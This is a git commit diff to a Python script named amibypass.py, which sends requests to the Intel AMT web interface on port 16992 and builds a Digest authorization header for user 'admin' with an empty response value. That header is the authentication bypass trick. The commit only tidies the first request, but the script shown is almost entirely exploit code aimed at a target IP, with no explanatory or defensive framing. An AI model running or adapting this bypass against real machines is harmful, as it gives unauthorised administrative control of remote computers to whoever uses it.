450c94e7684ae7434e9e80e7057062c7e7f281ac
kd0kkv <sarnold85@gmail.com>
2017-05-08 19:07:18 -0500

    Update amibypass.py

--- amibypass.py
+++ amibypass.py
@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 import requests
-from requests.auth import HTTPDigestAuth
 import sys
 
 if len(sys.argv) > 1:
@@ -9,7 +8,7 @@ else:
    ip = '10.42.0.52'
 
 url = 'http://'+ip+':16992/index.htm'
-req = requests.get(url, auth=HTTPDigestAuth('admin', ''))
+req = requests.get(url)
 auth = req.headers['WWW-Authenticate']
 words = auth.split('"')
 headers = 'Digest username= "admin", realm="'+words[1]+'", nonce="'+words[3]+'", uri="index.htm", response="", qop="auth", nc="00000001", cnonce="8858482c60513ab5" '
